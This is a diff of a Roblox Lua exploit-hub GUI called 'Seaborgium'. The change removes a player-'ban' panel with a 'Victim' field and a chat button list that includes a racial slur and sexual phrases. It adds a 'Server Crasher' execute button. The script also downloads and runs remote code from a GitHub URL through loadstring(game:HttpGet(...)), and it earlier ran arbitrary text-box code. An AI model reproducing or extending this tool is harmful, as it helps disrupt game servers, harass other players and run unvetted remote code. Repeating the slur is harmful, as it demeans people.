 msbg.Position = UDim2.new(0.0394088663, 0, 0.0440250859, 0)
 msbg.Size = UDim2.new(0, 186, 0, 154)
 
-UICorner_11.Parent = msbg
+UICorner_39.Parent = msbg
 
 sfmsg.Name = "sfmsg"
 sfmsg.Parent = msbg
@@ -512,6 +1077,7 @@ sfmsg.BackgroundTransparency = 1.000
 sfmsg.BorderColor3 = Color3.fromRGB(0, 0, 0)
 sfmsg.BorderSizePixel = 0
 sfmsg.Size = UDim2.new(0, 186, 0, 145)
+sfmsg.CanvasSize = UDim2.new(0, 0, 3, 0)
 sfmsg.ScrollBarThickness = 8
 
 IY.Name = "IY"
@@ -520,7 +1086,7 @@ IY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 IY.BackgroundTransparency = 1.000
 IY.BorderColor3 = Color3.fromRGB(0, 0, 0)
 IY.BorderSizePixel = 0
-IY.Position = UDim2.new(0.160999998, 0, 0.0299999993, 0)
+IY.Position = UDim2.new(0.160999998, 0, 0.0199999996, 0)
 IY.Size = UDim2.new(0, 126, 0, 100)
 IY.Image = "http://www.roblox.com/asset/?id=16698176625"
 
@@ -540,22 +1106,22 @@ runiy.TextSize = 14.000
 runiy.TextStrokeTransparency = 0.000
 runiy.TextWrapped = true
 
-UICorner_12.Parent = runiy
+UICorner_40.Parent = runiy
 
-UICorner_13.CornerRadius = UDim.new(0.150000006, 0)
-UICorner_13.Parent = IY
+UICorner_41.CornerRadius = UDim.new(0.150000006, 0)
+UICorner_41.Parent = IY
 
 c4bh.Name = "c4bh"
 c4bh.Parent = sfmsg
 c4bh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 c4bh.BorderColor3 = Color3.fromRGB(0, 0, 0)
 c4bh.BorderSizePixel = 0
-c4bh.Position = UDim2.new(0.160999909, 0, 0.510590851, 0)
+c4bh.Position = UDim2.new(0.160999998, 0, 0.340000004, 0)
 c4bh.Size = UDim2.new(0, 126, 0, 100)
 c4bh.Image = "http://www.roblox.com/asset/?id=16699190898"
 
-UICorner_14.CornerRadius = UDim.new(0.150000006, 0)
-UICorner_14.Parent = c4bh
+UICorner_42.CornerRadius = UDim.new(0.150000006, 0)
+UICorner_42.Parent = c4bh
 
 runc4bh.Name = "runc4bh"
 runc4bh.Parent = c4bh
@@ -573,573 +1139,60 @@ runc4bh.TextSize = 14.000
 runc4bh.TextStrokeTransparency = 0.000
 runc4bh.TextWrapped = true
 
-UICorner_15.Parent = runc4bh
-
-UICorner_16.Parent = mscrip
-
-character.Name = "character"
-character.Parent = mainsecotin
-character.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-character.BackgroundTransparency = 1.000
-character.BorderColor3 = Color3.fromRGB(0, 0, 0)
-character.BorderSizePixel = 0
-character.Size = UDim2.new(0, 1, 0, 1)
-character.Visible = false
-
-speed.Name = "speed"
-speed.Parent = character
-speed.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-speed.BackgroundTransparency = 0.150
-speed.BorderColor3 = Color3.fromRGB(0, 0, 0)
-speed.BorderSizePixel = 0
-speed.Position = UDim2.new(13, 0, 18, 0)
-speed.Size = UDim2.new(0, 176, 0, 39)
-speed.Font = Enum.Font.SourceSansBold
-speed.Text = "Speed"
-speed.TextColor3 = Color3.fromRGB(141, 174, 176)
-speed.TextScaled = true
-speed.TextSize = 14.000
-speed.TextWrapped = true
-
-UICorner_17.Parent = speed
-
-sped.Name = "sped"
-sped.Parent = speed
-sped.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-sped.BackgroundTransparency = 0.300
-sped.BorderColor3 = Color3.fromRGB(0, 0, 0)
-sped.BorderSizePixel = 0
-sped.Position = UDim2.new(1.10227275, 0, 0, 0)
-sped.Size = UDim2.new(0, 126, 0, 39)
-sped.Font = Enum.Font.SourceSans
-sped.Text = "16"
-sped.TextColor3 = Color3.fromRGB(0, 0, 0)
-sped.TextSize = 14.000
-
-UICorner_18.Parent = sped
-
-jp.Name = "jp"
-jp.Parent = character
-jp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-jp.BackgroundTransparency = 0.150
-jp.BorderColor3 = Color3.fromRGB(0, 0, 0)
-jp.BorderSizePixel = 0
-jp.Position = UDim2.new(13, 0, 83, 0)
-jp.Size = UDim2.new(0, 176, 0, 39)
-jp.Font = Enum.Font.SourceSansBold
-jp.Text = "Jump Power"
-jp.TextColor3 = Color3.fromRGB(141, 174, 176)
-jp.TextSize = 32.000
-jp.TextWrapped = true
-
-UICorner_19.Parent = jp
-
-jpower.Name = "jpower"
-jpower.Parent = jp
-jpower.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-jpower.BackgroundTransparency = 0.300
-jpower.BorderColor3 = Color3.fromRGB(0, 0, 0)
-jpower.BorderSizePixel = 0
-jpower.Position = UDim2.new(1.10227275, 0, 0, 0)
-jpower.Size = UDim2.new(0, 126, 0, 39)
-jpower.Font = Enum.Font.SourceSans
-jpower.Text = "7.2"
-jpower.TextColor3 = Color3.fromRGB(0, 0, 0)
-jpower.TextSize = 14.000
-
-UICorner_20.Parent = jpower
-
-use.Name = "use"
-use.Parent = character
-use.BackgroundColor3 = Color3.fromRGB(125, 154, 156)
-use.BackgroundTransparency = 0.250
-use.BorderColor3 = Color3.fromRGB(0, 0, 0)
-use.BorderSizePixel = 0
-use.Position = UDim2.new(88, 0, 137.765015, 0)
-use.Size = UDim2.new(0, 167, 0, 34)
-use.Font = Enum.Font.SourceSansBold
-use.Text = "Apply"
-use.TextColor3 = Color3.fromRGB(39, 65, 66)
-use.TextScaled = true
-use.TextSize = 14.000
-use.TextStrokeColor3 = Color3.fromRGB(163, 163, 163)
-use.TextStrokeTransparency = 0.000
-use.TextWrapped = true
-
-UICorner_21.Parent = use
-
-whispa.Name = "whispa"
-whispa.Parent = mainsecotin
-whispa.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-whispa.BackgroundTransparency = 0.100
-whispa.BorderColor3 = Color3.fromRGB(0, 0, 0)
-whispa.BorderSizePixel = 0
-whispa.Position = UDim2.new(0.0559008382, 0, 0.129251704, 0)
-whispa.Size = UDim2.new(0, 175, 0, 31)
-whispa.Font = Enum.Font.SourceSansBold
-whispa.PlaceholderColor3 = Color3.fromRGB(102, 178, 113)
-whispa.PlaceholderText = "Whisper"
-whispa.Text = ""
-whispa.TextColor3 = Color3.fromRGB(0, 0, 0)
-whispa.TextScaled = true
-whispa.TextSize = 14.000
-whispa.TextWrapped = true
-
-TextBox.Parent = whispa
-TextBox.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-TextBox.BackgroundTransparency = 0.100
-TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextBox.BorderSizePixel = 0
-TextBox.Position = UDim2.new(-0.00345824566, 0, 1.51861966, 0)
-TextBox.Size = UDim2.new(0, 255, 0, 71)
-TextBox.ZIndex = 2
-TextBox.ClearTextOnFocus = false
-TextBox.Font = Enum.Font.SourceSansBold
-TextBox.MultiLine = true
-TextBox.PlaceholderColor3 = Color3.fromRGB(102, 178, 113)
-TextBox.Text = ""
-TextBox.TextColor3 = Color3.fromRGB(207, 207, 207)
-TextBox.TextSize = 18.000
-TextBox.TextWrapped = true
-TextBox.TextXAlignment = Enum.TextXAlignment.Left
-TextBox.TextYAlignment = Enum.TextYAlignment.Top
-
-UICorner_22.CornerRadius = UDim.new(0, 5)
-UICorner_22.Parent = TextBox
-
-TextButton.Parent = TextBox
-TextButton.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-TextButton.BackgroundTransparency = 0.100
-TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(1.03499997, 0, -0.0199999996, 0)
-TextButton.Size = UDim2.new(0, 46, 0, 46)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = ""
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
-TextButton.TextWrapped = true
-
-UICorner_23.CornerRadius = UDim.new(0, 5)
-UICorner_23.Parent = TextButton
-
-ImageLabel_9.Parent = TextButton
-ImageLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageLabel_9.BackgroundTransparency = 1.000
-ImageLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ImageLabel_9.BorderSizePixel = 0
-ImageLabel_9.Position = UDim2.new(0.130434781, 0, 0.0652154014, 0)
-ImageLabel_9.Size = UDim2.new(0, 40, 0, 40)
-ImageLabel_9.Image = "rbxassetid://12099513379"
-ImageLabel_9.ImageColor3 = Color3.fromRGB(208, 202, 213)
-ImageLabel_9.ImageTransparency = 0.300
-
-cchat.Name = "cchat"
-cchat.Parent = TextBox
-cchat.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-cchat.BackgroundTransparency = 0.100
-cchat.BorderColor3 = Color3.fromRGB(0, 0, 0)
-cchat.BorderSizePixel = 0
-cchat.Position = UDim2.new(1.03299999, 0, 0.728999972, 0)
-cchat.Size = UDim2.new(0, 47, 0, 19)
-cchat.Font = Enum.Font.SourceSansBold
-cchat.Text = "Clear Box"
-cchat.TextColor3 = Color3.fromRGB(0, 0, 0)
-cchat.TextScaled = true
-cchat.TextSize = 14.000
-cchat.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-cchat.TextStrokeTransparency = 0.600
-cchat.TextWrapped = true
-
-UICorner_24.CornerRadius = UDim.new(0, 5)
-UICorner_24.Parent = cchat
-
-UICorner_25.Parent = whispa
-
-title.Name = "title"
-title.Parent = whispa
-title.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-title.BackgroundTransparency = 0.100
-title.BorderColor3 = Color3.fromRGB(0, 0, 0)
-title.BorderSizePixel = 0
-title.Position = UDim2.new(1.046, 0, -0.225999996, 0)
-title.Size = UDim2.new(0, 123, 0, 44)
-title.ZIndex = 2
-title.Font = Enum.Font.SourceSansBold
-title.Text = "Chat"
-title.TextColor3 = Color3.fromRGB(0, 0, 0)
-title.TextScaled = true
-title.TextSize = 14.000
-title.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-title.TextStrokeTransparency = 0.000
-title.TextWrapped = true
-
-UICorner_26.Parent = title
-
-swearwords.Name = "swearwords"
-swearwords.Parent = title
-swearwords.BackgroundColor3 = Color3.fromRGB(15, 38, 37)
-swearwords.BackgroundTransparency = 0.200
-swearwords.BorderColor3 = Color3.fromRGB(0, 0, 0)
-swearwords.BorderSizePixel = 0
-swearwords.Position = UDim2.new(1.33333337, 0, -0.5, 0)
-swearwords.Size = UDim2.new(0, 100, 0, 120)
-swearwords.Visible = false
-
-UICorner_27.Parent = swearwords
-
-bg.Name = "bg"
-bg.Parent = swearwords
-bg.BackgroundColor3 = Color3.fromRGB(15, 38, 37)
-bg.BackgroundTransparency = 0.200
-bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
-bg.BorderSizePixel = 0
-bg.ClipsDescendants = true
-bg.Position = UDim2.new(0.0799999982, 0, 0.100060426, 0)
-bg.Size = UDim2.new(0, 84, 0, 102)
-
-UICorner_28.Parent = bg
-
-ScrollingFrame_2.Parent = bg
-ScrollingFrame_2.Active = true
-ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ScrollingFrame_2.BackgroundTransparency = 1.000
-ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ScrollingFrame_2.BorderSizePixel = 0
-ScrollingFrame_2.Size = UDim2.new(0, 84, 0, 102)
-ScrollingFrame_2.ScrollBarThickness = 8
-
-UIListLayout_2.Parent = ScrollingFrame_2
-UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
-UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout_2.Padding = UDim.new(0.0350000001, 0)
-
-bgnotouch.Name = "bgnotouch"
-bgnotouch.Parent = ScrollingFrame_2
-bgnotouch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-bgnotouch.BorderColor3 = Color3.fromRGB(0, 0, 0)
-bgnotouch.BorderSizePixel = 0
-bgnotouch.Position = UDim2.new(0.0714285746, 0, 0, 0)
-
-as.Name = "[as]"
-as.Parent = ScrollingFrame_2
-as.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-as.BackgroundTransparency = 0.100
-as.BorderColor3 = Color3.fromRGB(0, 0, 0)
-as.BorderSizePixel = 0
-as.Size = UDim2.new(0, 72, 0, 18)
-as.Font = Enum.Font.SourceSansBold
-as.Text = "Ass"
-as.TextColor3 = Color3.fromRGB(0, 0, 0)
-as.TextScaled = true
-as.TextSize = 14.000
-as.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-as.TextStrokeTransparency = 0.000
-as.TextWrapped = true
-
-UICorner_29.Parent = as
-
-ashole.Name = "[as]hole"
-ashole.Parent = ScrollingFrame_2
-ashole.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-ashole.BackgroundTransparency = 0.100
-ashole.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ashole.BorderSizePixel = 0
-ashole.Size = UDim2.new(0, 72, 0, 18)
-ashole.Font = Enum.Font.SourceSansBold
-ashole.Text = "Asshole"
-ashole.TextColor3 = Color3.fromRGB(0, 0, 0)
-ashole.TextScaled = true
-ashole.TextSize = 14.000
-ashole.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-ashole.TextStrokeTransparency = 0.000
-ashole.TextWrapped = true
-
-UICorner_30.Parent = ashole
-
-nega.Name = "nega"
-nega.Parent = ScrollingFrame_2
-nega.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-nega.BackgroundTransparency = 0.100
-nega.BorderColor3 = Color3.fromRGB(0, 0, 0)
-nega.BorderSizePixel = 0
-nega.Size = UDim2.new(0, 72, 0, 18)
-nega.Font = Enum.Font.SourceSansBold
-nega.Text = "Nigga"
-nega.TextColor3 = Color3.fromRGB(0, 0, 0)
-nega.TextScaled = true
-nega.TextSize = 14.000
-nega.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-nega.TextStrokeTransparency = 0.000
-nega.TextWrapped = true
-
-UICorner_31.Parent = nega
-
-icome.Name = "icome"
-icome.Parent = ScrollingFrame_2
-icome.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-icome.BackgroundTransparency = 0.100
-icome.BorderColor3 = Color3.fromRGB(0, 0, 0)
-icome.BorderSizePixel = 0
-icome.Size = UDim2.new(0, 72, 0, 18)
-icome.Font = Enum.Font.SourceSansBold
-icome.Text = "i CUMMED"
-icome.TextColor3 = Color3.fromRGB(0, 0, 0)
-icome.TextScaled = true
-icome.TextSize = 14.000
-icome.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-icome.TextStrokeTransparency = 0.000
-icome.TextWrapped = true
-
-UICorner_32.Parent = icome
-
-bitkh.Name = "bitkh"
-bitkh.Parent = ScrollingFrame_2
-bitkh.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-bitkh.BackgroundTransparency = 0.100
-bitkh.BorderColor3 = Color3.fromRGB(0, 0, 0)
-bitkh.BorderSizePixel = 0
-bitkh.Size = UDim2.new(0, 72, 0, 18)
-bitkh.Font = Enum.Font.SourceSansBold
-bitkh.Text = "Bitch"
-bitkh.TextColor3 = Color3.fromRGB(0, 0, 0)
-bitkh.TextScaled = true
-bitkh.TextSize = 14.000
-bitkh.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-bitkh.TextStrokeTransparency = 0.000
-bitkh.TextWrapped = true
-
-UICorner_33.Parent = bitkh
-
-shitt.Name = "shitt"
-shitt.Parent = ScrollingFrame_2
-shitt.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-shitt.BackgroundTransparency = 0.100
-shitt.BorderColor3 = Color3.fromRGB(0, 0, 0)
-shitt.BorderSizePixel = 0
-shitt.Size = UDim2.new(0, 72, 0, 18)
-shitt.Font = Enum.Font.SourceSansBold
-shitt.Text = "Shit"
-shitt.TextColor3 = Color3.fromRGB(0, 0, 0)
-shitt.TextScaled = true
-shitt.TextSize = 14.000
-shitt.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-shitt.TextStrokeTransparency = 0.000
-shitt.TextWrapped = true
-
-UICorner_34.Parent = shitt
-
-BELLEND.Name = "BELLEND"
-BELLEND.Parent = ScrollingFrame_2
-BELLEND.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-BELLEND.BackgroundTransparency = 0.100
-BELLEND.BorderColor3 = Color3.fromRGB(0, 0, 0)
-BELLEND.BorderSizePixel = 0
-BELLEND.Size = UDim2.new(0, 72, 0, 18)
-BELLEND.Font = Enum.Font.SourceSansBold
-BELLEND.Text = "Bellend"
-BELLEND.TextColor3 = Color3.fromRGB(0, 0, 0)
-BELLEND.TextScaled = true
-BELLEND.TextSize = 14.000
-BELLEND.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-BELLEND.TextStrokeTransparency = 0.000
-BELLEND.TextWrapped = true
-
-UICorner_35.Parent = BELLEND
-
-_10vepp.Name = "10vepp"
-_10vepp.Parent = ScrollingFrame_2
-_10vepp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-_10vepp.BackgroundTransparency = 0.100
-_10vepp.BorderColor3 = Color3.fromRGB(0, 0, 0)
-_10vepp.BorderSizePixel = 0
-_10vepp.Size = UDim2.new(0, 72, 0, 18)
-_10vepp.Font = Enum.Font.SourceSansBold
-_10vepp.Text = "i love cocks"
-_10vepp.TextColor3 = Color3.fromRGB(0, 0, 0)
-_10vepp.TextSize = 16.000
-_10vepp.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
-_10vepp.TextStrokeTransparency = 0.000
-_10vepp.TextWrapped = true
-
-UICorner_36.Parent = _10vepp
-
-m4gbans.Name = "m4g / bans..."
-m4gbans.Parent = mainsecotin
-m4gbans.Active = true
-m4gbans.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-m4gbans.BackgroundTransparency = 1.000
-m4gbans.BorderColor3 = Color3.fromRGB(0, 0, 0)
-m4gbans.BorderSizePixel = 0
-m4gbans.Size = UDim2.new(0, 344, 0, 147)
-m4gbans.Visible = false
-m4gbans.CanvasPosition = Vector2.new(0, 147)
-
-Mods4Game.Name = "Mods4Game"
-Mods4Game.Parent = m4gbans
-Mods4Game.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-Mods4Game.BackgroundTransparency = 0.100
-Mods4Game.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Mods4Game.BorderSizePixel = 0
-Mods4Game.Position = UDim2.new(0.0410000011, 0, 0.0850000009, 0)
-Mods4Game.Size = UDim2.new(0, 131, 0, 33)
-Mods4Game.Font = Enum.Font.SourceSansBold
-Mods4Game.Text = "Extra Map"
-Mods4Game.TextColor3 = Color3.fromRGB(102, 178, 113)
-Mods4Game.TextScaled = true
-Mods4Game.TextSize = 14.000
-Mods4Game.TextWrapped = true
-
-UICorner_37.Parent = Mods4Game
-
-ClearBANS.Name = "ClearBANS"
-ClearBANS.Parent = Mods4Game
-ClearBANS.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-ClearBANS.BackgroundTransparency = 0.100
-ClearBANS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ClearBANS.BorderSizePixel = 0
-ClearBANS.Position = UDim2.new(-0.00510365749, 0, 1.77241838, 0)
-ClearBANS.Size = UDim2.new(0, 131, 0, 33)
-ClearBANS.Font = Enum.Font.SourceSansBold
-ClearBANS.Text = "Clear Ban Texts"
-ClearBANS.TextColor3 = Color3.fromRGB(178, 99, 99)
-ClearBANS.TextScaled = true
-ClearBANS.TextSize = 14.000
-ClearBANS.TextWrapped = true
-
-UICorner_38.Parent = ClearBANS
-
-tgp.Name = "tgp"
-tgp.Parent = Mods4Game
-tgp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-tgp.BackgroundTransparency = 0.100
-tgp.BorderColor3 = Color3.fromRGB(0, 0, 0)
-tgp.BorderSizePixel = 0
-tgp.Position = UDim2.new(1.2061069, 0, -0.272727281, 0)
-tgp.Size = UDim2.new(0, 154, 0, 35)
-tgp.Font = Enum.Font.SourceSansBold
-tgp.Text = "Total Game Parts :"
-tgp.TextColor3 = Color3.fromRGB(154, 170, 101)
-tgp.TextScaled = true
-tgp.TextSize = 14.000
-tgp.TextWrapped = true
-
-UICorner_39.Parent = tgp
-
-gameversion.Name = "gameversion"
-gameversion.Parent = Mods4Game
-gameversion.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
-gameversion.BackgroundTransparency = 0.100
-gameversion.BorderColor3 = Color3.fromRGB(0, 0, 0)
-gameversion.BorderSizePixel = 0
-gameversion.Position = UDim2.new(1.2061069, 0, 1.21212304, 0)
-gameversion.Size = UDim2.new(0, 154, 0, 51)
-gameversion.Font = Enum.Font.SourceSansBold
-gameversion.Text = ""
-gameversion.TextColor3 = Color3.fromRGB(154, 170, 101)
-gameversion.TextScaled = true
-gameversion.TextSize = 14.000
-gameversion.TextWrapped = true
-
-UICorner_40.Parent = gameversion
-
-ban.Name = "ban."
-ban.Parent = m4gbans
-ban.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
-ban.BackgroundTransparency = 0.100
-ban.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ban.BorderSizePixel = 0
-ban.Position = UDim2.new(0.550000012, 0, 0.550000012, 0)
-ban.Size = UDim2.new(0, 125, 0, 50)
-ban.Font = Enum.Font.SourceSansBold
-ban.Text = "Current ban Method: Teleport"
-ban.TextColor3 = Color3.fromRGB(165, 124, 108)
-ban.TextScaled = true
-ban.TextSize = 20.000
-ban.TextWrapped = true
-
-UICorner_41.Parent = ban
-
-Victim.Name = "Victim."
-Victim.Parent = ban
-Victim.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
-Victim.BackgroundTransparency = 0.100
-Victim.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Victim.BorderSizePixel = 0
-Victim.Position = UDim2.new(-1.40799999, 0, 0, 0)
-Victim.Size = UDim2.new(0, 158, 0, 50)
-Victim.ClearTextOnFocus = false
-Victim.Font = Enum.Font.SourceSansBold
-Victim.PlaceholderColor3 = Color3.fromRGB(145, 89, 89)
-Victim.PlaceholderText = "Vicitm"
-Victim.Text = ""
-Victim.TextColor3 = Color3.fromRGB(0, 0, 0)
-Victim.TextScaled = true
-Victim.TextSize = 14.000
-Victim.TextWrapped = true
-
-UICorner_42.Parent = Victim
-
-reason.Name = "reason."
-reason.Parent = ban
-reason.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
-reason.BackgroundTransparency = 0.100
-reason.BorderColor3 = Color3.fromRGB(0, 0, 0)
-reason.BorderSizePixel = 0
-reason.Position = UDim2.new(-1.31200004, 0, 1.27999997, 0)
-reason.Size = UDim2.new(0, 229, 0, 56)
-reason.Font = Enum.Font.SourceSansBold
-reason.PlaceholderColor3 = Color3.fromRGB(132, 69, 69)
-reason.PlaceholderText = "Reason for ban"
-reason.Text = ""
-reason.TextColor3 = Color3.fromRGB(0, 0, 0)
-reason.TextScaled = true
-reason.TextSize = 14.000
-reason.TextStrokeTransparency = 0.500
-reason.TextWrapped = true
-
-UICorner_43.Parent = reason
-
-BanUser.Name = "BanUser"
-BanUser.Parent = ban
-BanUser.BackgroundColor3 = Color3.fromRGB(63, 105, 107)
-BanUser.BackgroundTransparency = 0.100
-BanUser.BorderColor3 = Color3.fromRGB(0, 0, 0)
-BanUser.BorderSizePixel = 0
-BanUser.Position = UDim2.new(0.600000024, 0, 1.34000003, 0)
-BanUser.Size = UDim2.new(0, 50, 0, 50)
-BanUser.Font = Enum.Font.SourceSans
-BanUser.Text = ""
-BanUser.TextColor3 = Color3.fromRGB(0, 0, 0)
-BanUser.TextSize = 14.000
-
-runban.Name = "runban."
-runban.Parent = BanUser
-runban.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-runban.BackgroundTransparency = 1.000
-runban.BorderColor3 = Color3.fromRGB(0, 0, 0)
-runban.BorderSizePixel = 0
-runban.Position = UDim2.new(0.0799999982, 0, 0.0599999987, 0)
-runban.Size = UDim2.new(0, 44, 0, 44)
-runban.Image = "rbxassetid://12099513379"
-runban.ImageColor3 = Color3.fromRGB(208, 202, 213)
-
-UICorner_44.Parent = BanUser
-
-runbanbg.Name = "runbanbg."
-runbanbg.Parent = BanUser
-runbanbg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-runbanbg.BackgroundTransparency = 1.000
-runbanbg.BorderColor3 = Color3.fromRGB(0, 0, 0)
-runbanbg.BorderSizePixel = 0
-runbanbg.Position = UDim2.new(0.119999997, 0, 0.119999997, 0)
-runbanbg.Size = UDim2.new(0, 38, 0, 38)
-runbanbg.Image = "rbxassetid://12099513379"
-runbanbg.ImageColor3 = Color3.fromRGB(163, 45, 45)
-runbanbg.ImageTransparency = 1.000
-
-UICorner_45.CornerRadius = UDim.new(0, 5)
-UICorner_45.Parent = Frame
+UICorner_43.Parent = runc4bh
+
+Crasher.Name = "Crasher"
+Crasher.Parent = sfmsg
+Crasher.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Crasher.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Crasher.BorderSizePixel = 0
+Crasher.Position = UDim2.new(0.160999998, 0, 0.660000026, 0)
+Crasher.Size = UDim2.new(0, 126, 0, 100)
+Crasher.Image = "http://www.roblox.com/asset/?id=17639586322"
+Crasher.ImageTransparency = 0.030
+
+UICorner_44.CornerRadius = UDim.new(0.150000006, 0)
+UICorner_44.Parent = Crasher
+
+runc4bh_2.Name = "runc4bh"
+runc4bh_2.Parent = Crasher
+runc4bh_2.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+runc4bh_2.BackgroundTransparency = 0.200
+runc4bh_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+runc4bh_2.BorderSizePixel = 0
+runc4bh_2.Position = UDim2.new(-0.0476190485, 0, 1.09999967, 0)
+runc4bh_2.Size = UDim2.new(0, 141, 0, 25)
+runc4bh_2.Font = Enum.Font.SourceSansBold
+runc4bh_2.Text = "Execute "
+runc4bh_2.TextColor3 = Color3.fromRGB(141, 174, 176)
+runc4bh_2.TextScaled = true
+runc4bh_2.TextSize = 14.000
+runc4bh_2.TextStrokeTransparency = 0.000
+runc4bh_2.TextWrapped = true
+
+UICorner_45.Parent = runc4bh_2
+
+TextLabel.Parent = Crasher
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.428571433, 0, 0.44770661, 0)
+TextLabel.Rotation = -13.000
+TextLabel.Size = UDim2.new(0, 72, 0, 28)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Server Crasher"
+TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(38, 0, 0)
+TextLabel.TextStrokeTransparency = 0.000
+TextLabel.TextWrapped = true
+
+UICorner_46.Parent = mscrip
+
+UICorner_47.CornerRadius = UDim.new(0, 5)
+UICorner_47.Parent = Frame
 
 BGTheme.Name = "BGTheme"
 BGTheme.Parent = Frame
@@ -1154,15 +1207,15 @@ BGTheme.Image = "rbxassetid://16093447178"
 BGTheme.ImageColor3 = Color3.fromRGB(55, 135, 135)
 BGTheme.ImageTransparency = 0.300
 
-UICorner_46.CornerRadius = UDim.new(0, 5)
-UICorner_46.Parent = BGTheme
+UICorner_48.CornerRadius = UDim.new(0, 5)
+UICorner_48.Parent = BGTheme
 
-UICorner_47.CornerRadius = UDim.new(1, 0)
-UICorner_47.Parent = Background
+UICorner_49.CornerRadius = UDim.new(1, 0)
+UICorner_49.Parent = Background
 
 -- Scripts:
 
-local function OTXNL_fake_script() -- icon.LocalScript 
+local function XGOSD_fake_script() -- icon.LocalScript 
 	local script = Instance.new('LocalScript', icon)
 
 	local frame = script.Parent.Parent.icon
@@ -1218,8 +1271,8 @@ local function OTXNL_fake_script() -- icon.LocalScript
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/roblox-scripts/main/Extra4Seaborg"))()
 	end)
 end
-coroutine.wrap(OTXNL_fake_script)()
-local function IZJYVTI_fake_script() -- section.LocalScript 
+coroutine.wrap(XGOSD_fake_script)()
+local function PERO_fake_script() -- section.LocalScript 
 	local script = Instance.new('LocalScript', section)
 
 	local sesc = script.Parent.Parent.mainsecotin
@@ -1270,97 +1323,16 @@ local function IZJYVTI_fake_script() -- section.LocalScript
 	end)
 	
 end
-coroutine.wrap(IZJYVTI_fake_script)()
-local function QODBTFK_fake_script() -- codebox.LocalScript 
-	local script = Instance.new('LocalScript', codebox)
-
-	local ran = math.random(0, 10)
-	local ptext = script.Parent
-	
-	if ran == 1 then
-		ptext.PlaceholderText = "Mags <3 Local |- Lexie"
-	elseif ran == 4 then
-		ptext.PlaceholderText = "#Mocal + #Lags |- Lexie"
-	else
-		ptext.PlaceholderText = "   Seaborgium | made by Alex54. & HighskyY8K"
-	end
-end
-coroutine.wrap(QODBTFK_fake_script)()
-local function QMXDFHQ_fake_script() -- Execute.LocalScript 
-	local script = Instance.new('LocalScript', Execute)
-
-	local cod_e = script.Parent.Parent.codeditorsw.codebox
-	
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Text = "Executed!"
-		loadstring(cod_e.Text)()
-		wait(1)
-		script.Parent.Text = "Execute"
-	end)
-	
-	script.Parent.Parent.CClear.MouseButton1Click:Connect(function()
-		script.Parent.Parent.CClear.Text = "Cleared!"
-		cod_e.Text = ""
-		wait(1)
-		script.Parent.Parent.CClear.Text = "Clear Code"
